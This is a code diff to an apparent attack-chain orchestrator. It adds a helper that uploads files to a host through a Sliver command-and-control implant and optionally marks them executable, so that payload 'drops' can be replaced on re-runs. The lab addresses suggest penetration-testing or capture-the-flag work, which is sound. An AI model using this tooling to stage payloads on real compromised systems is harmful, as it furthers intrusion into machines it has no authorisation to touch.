@@ -369,6 +369,30 @@ def sliver_exec(implant_id: str, *commands: str, timeout: int = 30) -> str:
         return ""
 
 
+def sliver_upload(implant_id: str, local_path: str, remote_path: str,
+                  *, overwrite: bool = True, chmod: str | None = None,
+                  timeout: int = 30) -> str:
+    """Upload a local file to the implant's host via Sliver.
+
+    Wraps :func:`sliver_exec` so callers don't have to remember Sliver's
+    ``upload`` flag conventions:
+      * ``-o`` / ``--overwrite`` is required when the remote file exists,
+        otherwise Sliver returns ``FailedPrecondition``. Defaults to True
+        because every chain step that re-runs needs to replace prior drops.
+      * ``-o`` here is the *upload* flag, NOT to be confused with
+        ``execute -o`` (capture-output) -- a subtle Sliver naming clash.
+
+    If ``chmod`` is provided the helper also issues a follow-up
+    ``execute -o chmod <mode> <remote>`` so the remote file lands with the
+    expected mode (Sliver uploads default to 0644 which isn't executable).
+    """
+    flag = "-o " if overwrite else ""
+    cmds = [f"upload {flag}{local_path} {remote_path}"]
+    if chmod is not None:
+        cmds.append(f"execute -o chmod {chmod} {remote_path}")
+    return sliver_exec(implant_id, *cmds, timeout=timeout)
+
+
 def run(target_ip: str, kali_ip: str = "10.10.0.2", file_port: int = 8000) -> dict:
     """Chain-orchestrator entrypoint.
 
